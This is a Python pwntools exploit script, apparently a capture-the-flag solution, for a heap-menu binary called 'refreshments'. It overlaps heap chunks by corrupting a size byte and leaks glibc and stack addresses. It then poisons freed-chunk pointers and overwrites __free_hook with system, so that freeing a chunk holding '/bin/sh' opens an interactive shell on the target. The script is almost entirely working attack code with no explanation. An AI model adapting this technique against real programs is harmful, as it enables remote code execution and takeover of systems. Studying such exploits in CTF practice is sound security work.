#!/usr/bin/env python3

from pwn import context, ELF, p64, remote, sys, u64

context.binary = 'refreshments'
glibc = ELF('glibc/libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1], sys.argv[2]
    return remote(host, port)


def create(option = b'1\n'):
    io.sendafter(b'>> ', option)


def delete(index: int):
    io.sendlineafter(b'>> ', b'2')
    io.sendlineafter(b'Choose glass to empty: ', str(index).encode())


def edit(index: int, data: bytes):
    io.sendlineafter(b'>> ', b'3')
    io.sendlineafter(b'Choose glass to customize: ', str(index).encode())
    io.sendafter(b'Add another drink: ', data)


def show(index: int) -> bytes:
    io.sendlineafter(b'>> ', b'4')
    io.sendlineafter(b'Choose glass: ', str(index).encode())
    io.recvuntil(b'Glass content: ')
    return io.recvuntil(b'\nMenu:', drop=True)


io = get_process()

create()  # 0
create()  # 1
create()  # 2
create()  # 3

edit(0, b'\0' * 0x58 + b'\xc1')
delete(1)

create()  # 4

glibc.address = u64(show(2)[:8]) - glibc.sym.main_arena - 88
io.success(f'Glibc base address: {hex(glibc.address)}')

create()  # 5
delete(2)

edit(5, p64(glibc.address + 0x5c1c20 - 5))

create()  # 6
create()  # 7

data = show(7)
stack_addr = u64(data[-3:] + data[:5]) - 0x168  # combine vdso address (MSB) and stack address (LSB)
io.success(f'Stack address: {hex(stack_addr)}')

delete(0)
delete(5)
edit(6, p64(stack_addr - 0x38))

create()  # 8
create(option=b'1' + b'\0' * 15 + b'\x62')  # 9 (mmap-ed chunk to prevent calloc from erasing the chunk)

data = show(9)[:0x38]
edit(9, data + p64(glibc.sym.__free_hook))
edit(0, p64(glibc.sym.system))
edit(8, b'/bin/sh\0')
delete(8)

io.interactive()
